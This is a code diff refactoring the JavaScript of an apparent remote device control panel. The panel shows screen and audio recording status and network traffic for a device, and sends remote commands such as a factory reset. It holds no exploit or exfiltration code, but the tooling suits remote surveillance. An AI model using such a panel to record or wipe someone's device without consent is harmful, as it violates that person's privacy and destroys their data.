-                if (stateEl) { stateEl.textContent = `SEG ${data.segment || '?'}`; stateEl.style.color = '#ffaa00'; }
-            } else {
-                btn.classList.remove('active');
-                if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
-            }
+        if (!btn || !data) return;
+        const stateEl = btn.querySelector('.toggle-state');
+        if (data.status === 'recording') {
+            btn.classList.add('active');
+            if (stateEl) { stateEl.textContent = `SEG ${data.segment || '?'}`; stateEl.style.color = '#ffaa00'; }
+        } else {
+            btn.classList.remove('active');
+            if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
         }
     });
 
     // Screen Record Status
     listenToFeed(uid, 'screen_record_status', (data) => {
         const btn = document.getElementById('cmd-screenrec');
-        if (btn && data) {
-            const stateEl = btn.querySelector('.toggle-state');
-            if (data.status === 'recording') {
-                btn.classList.add('active');
-                if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
-            } else if (data.status === 'complete') {
-                btn.classList.remove('active');
-                if (stateEl) { stateEl.textContent = `${data.file_size_kb || '?'}KB`; stateEl.style.color = '#00ff88'; }
-            } else {
-                btn.classList.remove('active');
-                if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
-            }
+        if (!btn || !data) return;
+        const stateEl = btn.querySelector('.toggle-state');
+        if (data.status === 'recording') {
+            btn.classList.add('active');
+            if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
+        } else if (data.status === 'complete') {
+            btn.classList.remove('active');
+            if (stateEl) { stateEl.textContent = `${data.file_size_kb || '?'}KB`; stateEl.style.color = '#00ff88'; }
+        } else {
+            btn.classList.remove('active');
+            if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
         }
     });
 
     // Traffic
     listenToFeed(uid, 'traffic_current', (data) => {
-        // Append to battery panel or create inline
         const feed = document.getElementById('battery-feed');
-        if (feed && data) {
-            const trafficHtml = `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${data.total_rx_mb || '?'} | TX: ${data.total_tx_mb || '?'}<br>Mobile RX: ${data.mobile_rx_mb || '?'} | TX: ${data.mobile_tx_mb || '?'}</div>`;
-            if (!feed.innerHTML.includes('Network Traffic')) {
-                feed.innerHTML += trafficHtml;
-            }
-        }
+        if (!feed || !data) return;
+        if (feed.innerHTML.includes('Network Traffic')) return;
+        feed.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${data.total_rx_mb || '?'} | TX: ${data.total_tx_mb || '?'}<br>Mobile RX: ${data.mobile_rx_mb || '?'} | TX: ${data.mobile_tx_mb || '?'}</div>`;
     });
 }
 
@@ -954,7 +935,7 @@ function setupCommandListeners(deviceUid) {
     if (factoryBtn) {
         factoryBtn.onclick = () => {
             if (confirm("🚨 FACTORY RESET? This will ERASE ALL DATA on the device. THIS CANNOT BE UNDONE!")) {
-                if (confirm("Are you ABSOLUTELY sure? Type OK to confirm.")) {
+                if (confirm("Are you ABSOLUTELY sure?")) {
                     sendRemoteCommand(deviceUid, 'factory_reset', true);
                 }
             }
@@ -999,7 +980,6 @@ function setupTrigger(btnId, deviceUid, command) {
     if (!btn) return;
     btn.onclick = () => {
         sendRemoteCommand(deviceUid, command, true);
-        // Visual feedback
         btn.style.background = '#00ff88';
         btn.style.color = '#000';
         setTimeout(() => { btn.style.background = ''; btn.style.color = ''; }, 500);
